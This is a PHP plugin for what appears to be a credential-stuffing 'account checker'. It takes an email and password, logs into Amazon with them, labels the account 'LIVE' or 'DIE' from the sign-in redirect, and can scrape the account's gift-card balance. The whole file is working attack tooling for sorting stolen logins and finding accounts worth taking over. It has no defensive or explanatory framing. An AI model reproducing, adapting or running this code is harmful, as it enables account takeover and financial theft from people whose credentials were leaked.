<?php
class check_amazon extends plugins {
	public $meta = array(
		'id' 	=> "amazon",
		'name' => "Check amazon",
		'version' => "1.0.0",
		'descrition' =>"Check amazon acc, points"
	);

	public $fields = array(
		"status" => "str",
		#"cards" => "str",
		"point" => "int",
	);

	public function check($user,$pass,$request) {
		return $this->runCheck($user,$pass,isset($request['cards']),isset($request['point']));
	}

	private function runCheck($m,$p,$check_card=false,$check_point=false) {
		$session = new Session();

		$return = array();

		$ref = "https://www.amazon.com/";

		if (!preg_match('/[\\\'\"](\/gp\/navigation\/redirector\.html\/ref\=sign\-in\-redirect.+?)[\\\'\"]/i',$session->connect($ref),$match)) {
			$return['status'] = "ERROR";
			return $return;
		}

		$url = "https://www.amazon.com" . $match[1];

		$html = $session->connect($url,$ref);
		$data = $session->get_field($html,"signIn");

		$data["email"] = $m;
		$data["password"] = $p;

		$html = $session->connect("https://www.amazon.com/ap/signin",$url,$data);

		if (strpos($html, 'Location: https://www.amazon.com?ie=UTF8&ref_=nav_ya_signin&') === false) {
			$return['status'] = "DIE";
			return $return;
		}

		if ($check_point) {
			$html = $session->connect("https://www.amazon.com/gp/css/gc/balance?ie=UTF8&ref_=ya_view_gc");
			if (preg_match('/<span>\$([0-9\.\,]+)<\/span/',$html,$match)) {
				$return['point'] = str_replace(",","",$match[1]);
			} else {
				$return['point'] = -1;
			}
		}

		$return['status'] = "LIVE";
		return $return;
	}

}
?>
